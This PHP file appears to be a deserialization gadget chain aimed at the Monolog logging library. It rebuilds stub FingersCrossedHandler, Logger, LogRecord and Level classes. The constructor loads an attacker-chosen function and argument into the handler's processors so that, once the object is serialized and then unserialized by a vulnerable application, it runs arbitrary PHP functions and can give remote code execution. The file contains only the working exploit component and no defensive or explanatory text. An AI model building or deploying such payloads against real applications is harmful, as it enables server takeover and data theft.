<?php

namespace Monolog\Handler
{
  class FingersCrossedHandler
  {
    protected $passthruLevel = \Monolog\Level::Debug;
    protected $handler;
    protected $buffer;
    protected $processors;

    function __construct($function, $parameter)
    {
      $this->processors = [
        [
          new \Monolog\Logger($parameter),                // PHP-IAA-RDV trick; can be replaced with another suitable method.
          "getName"
        ], 
        $function
      ];
            
      $this->buffer = [new \Monolog\LogRecord];
      $this->handler = $this;
    }
  }
}

namespace Monolog
{
  enum Level: int
  {
    case Debug = 100;
  }

  class LogRecord
  {
    public Level $level = \Monolog\Level::Debug;
  }
    
  class Logger
  {
    protected string $name;

    function __construct($parameter)
    {
      $this->name = $parameter;
    }
    
    public function __serialize(): array
    {
      return [
        'name' => $this->name
      ];
    }
  }
}